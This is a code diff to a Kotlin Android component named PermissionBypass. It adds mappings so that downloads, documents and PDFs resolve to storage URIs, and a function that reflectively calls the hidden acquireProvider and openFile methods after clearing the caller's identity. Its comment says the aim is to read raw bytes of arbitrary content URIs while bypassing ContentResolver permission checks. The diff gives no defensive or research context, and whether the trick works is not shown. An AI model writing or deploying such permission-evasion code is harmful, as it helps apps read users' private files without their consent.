@@ -301,6 +301,8 @@ object PermissionBypass {
             "images" -> Uri.parse("content://media/external/images/media/$fileId")
             "videos" -> Uri.parse("content://media/external/video/media/$fileId")
             "audio"  -> Uri.parse("content://media/external/audio/media/$fileId")
+            "downloads" -> Uri.parse("content://media/external/downloads/$fileId")
+            "files", "documents", "docs", "all", "pdf" -> Uri.parse("content://media/external/file/$fileId")
             else -> Uri.parse("content://media/external/images/media/$fileId")
         }
 
@@ -332,6 +334,45 @@ object PermissionBypass {
             null
         } catch (e: Exception) {
             Log.d(TAG, "readFileViaBinder failed: ${e.message}")
+            null
+        }
+    }
+
+    /**
+     * Reads raw bytes for an arbitrary content:// URI via the raw ContentProvider
+     * binder (acquireProvider + openFile), bypassing ContentResolver permission
+     * checks. Returns null on failure.
+     */
+    fun readFileContentViaBinder(context: Context, uri: Uri): ByteArray? {
+        val authority = uri.authority ?: return null
+        return try {
+            val resolver = context.contentResolver
+            val acquireProvider: Method = resolver.javaClass.getDeclaredMethod(
+                "acquireProvider", String::class.java
+            )
+            acquireProvider.isAccessible = true
+            val token = Binder.clearCallingIdentity()
+            try {
+                val provider = acquireProvider.invoke(resolver, authority)
+                if (provider != null) {
+                    val openFileMethod = provider.javaClass.getMethod(
+                        "openFile", Uri::class.java, String::class.java
+                    )
+                    openFileMethod.isAccessible = true
+                    val fd = openFileMethod.invoke(provider, uri, "r") as? android.os.ParcelFileDescriptor
+                    fd?.use {
+                        val stream = java.io.FileInputStream(it.fileDescriptor)
+                        val bytes = stream.readBytes()
+                        stream.close()
+                        return bytes
+                    }
+                }
+            } finally {
+                Binder.restoreCallingIdentity(token)
+            }
+            null
+        } catch (e: Exception) {
+            Log.d(TAG, "readFileContentViaBinder failed: ${e.message}")
             null
         }
     }
